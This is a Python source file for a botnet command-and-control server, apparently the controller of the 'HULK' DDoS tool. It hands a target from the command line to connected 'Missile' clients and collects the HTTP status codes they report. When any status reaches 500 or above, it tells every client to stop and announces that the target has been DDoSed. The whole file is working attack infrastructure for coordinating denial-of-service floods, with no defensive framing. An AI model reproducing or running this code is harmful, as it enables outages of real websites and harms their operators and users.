import queue
import re
import select
import socket
import sys

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setblocking(0)
server.bind(('', 666))
server.listen(100)  # Max Number of Missiles available.

inputs = [server]
outputs = []
message_queues = {}
completed = False

print("Hulk Server is Live!")
while inputs:
    readable, writable, exceptional = select.select(
        inputs, outputs, inputs)
    for elem in readable:
        if elem is server:
            connection, addr = elem.accept()
            ip, port = addr
            missile = socket.gethostbyaddr(ip)[0]
            print(f"Established connection with Missile {missile}:{port}.")
            connection.setblocking(0)
            inputs.append(connection)
            message_queues[connection] = queue.Queue()
        else:
            try:
                data = elem.recv(1024).decode()
                ip, port = elem.getpeername()
                missile = socket.gethostbyaddr(ip)[0]
                print(f"[{missile}:{port}]", data)
                m = re.search("\[{1}(.*)\]{1}", data)
                if completed:
                    print(f"Sending Stop signal to [{missile}:{port}].")
                    message_queues[elem].put("STOP")
                elif m:
                    status_list = m.group(1).split(',')
                    if all([
                        int(status) < 500
                        for status in status_list
                    ]):
                        message_queues[elem].put(sys.argv[1])
                    else:
                        completed = True
                        print(f"Sending Stop signal to [{missile}:{port}].")
                        message_queues[elem].put("STOP")
                elif data.lower() == "disconnecting":
                    print(f"Disconnected from [{missile}:{port}].")
                    del message_queues[elem]
                    if elem in outputs:
                        outputs.remove(elem)
                    if elem in inputs:
                        inputs.remove(elem)
                    elem.close()
                    continue
                else:
                    message_queues[elem].put(sys.argv[1])
                if elem not in outputs:
                    outputs.append(elem)
            except Exception as e:
                if elem in outputs:
                    outputs.remove(elem)
                inputs.remove(elem)
                elem.close()
                del message_queues[elem]

    for elem in writable:
        try:
            ip, port = elem.getpeername()
            missile = socket.gethostbyaddr(ip)[0]
            next_msg = message_queues[elem].get_nowait()
        except:
            if elem in outputs:
                outputs.remove(elem)
        else:
            try:
                elem.send(next_msg.encode())
                print(f"Attached target [{next_msg}] to [{missile}:{port}].")
            except:
                outputs.remove(elem)

    for elem in exceptional:
        inputs.remove(elem)
        if elem in outputs:
            outputs.remove(elem)
        elem.close()
        del message_queues[elem]
print(f"Succesfully DDoSed {sys.argv[1]}!")
